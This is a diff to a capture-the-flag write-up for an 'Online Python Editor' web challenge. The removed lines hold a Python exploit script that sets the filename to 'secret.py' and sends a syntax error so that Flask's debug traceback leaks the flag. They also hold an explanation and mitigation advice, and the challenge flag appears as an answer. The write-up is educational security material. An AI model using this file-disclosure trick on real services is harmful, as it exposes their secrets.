@@ -1,9 +1,7 @@
 **Writeup: CTF Challenge - Online Python Editor**
 
 **Challenge Name:** Online Python Editor  
-**Category:** Web Exploitation  
-**Difficulty:** Medium  
-**Flag:** `TRX{4ll_y0u_h4v3_t0_d0_1s_l00k_4t_th3_s0urc3_c0d3}`
+
 
 ---
 
@@ -82,52 +80,4 @@ SyntaxError: invalid syntax
 
 ---
 
-### **Automated Exploit Script**
-```python
-import requests
-import re
-
-TARGET_URL = "http://python.ctf.theromanxpl0.it:7001/check"
-
-payload = {
-    "source": (
-        "def main():\n"
-        "    print(\"Here's the flag: \")\n"
-        "    print(FLAG)\n\n"
-        "FLAG = \"\"\n"
-        "invalid syntax"
-    ),
-    "filename": "secret.py"
-}
-
-response = requests.post(TARGET_URL, json=payload)
-error = response.json().get("error", "")
-
-flag_match = re.search(r'FLAG = "(TRX{.*?})"', error)
-print(f"Captured Flag: {flag_match.group(1)}") if flag_match else print("Exploit failed")
-```
-
----
-
-### **Why This Works**
-- **Filename Poisoning:** Forces error traceback to reference `secret.py`
-- **Line Alignment:** Matches code structure to expose the flag line
-- **Error Context:** Flask's debug mode shows 3-5 lines around errors
-
----
-
-### **Mitigation Recommendations**
-1. **Sanitize Filename Inputs**  
-   Restrict filenames to safe values.
-   
-2. **Disable Debug Mode**  
-   Prevent detailed error messages in production.
-
-3. **Sandbox Code Analysis**  
-   Use isolated environments for parsing untrusted code.
-
----
-
-**Flag Captured:** `TRX{4ll_y0u_h4v3_t0_d0_1s_l00k_4t_th3_s0urc3_c0d3}`
-
-This challenge demonstrates the importance of proper error handling and input validation in web applications. Always sanitize user-controlled parameters that interact with file systems!
+**Flag:** `TRX{4ll_y0u_h4v3_t0_d0_1s_l00k_4t_th3_s0urc3_c0d3}`
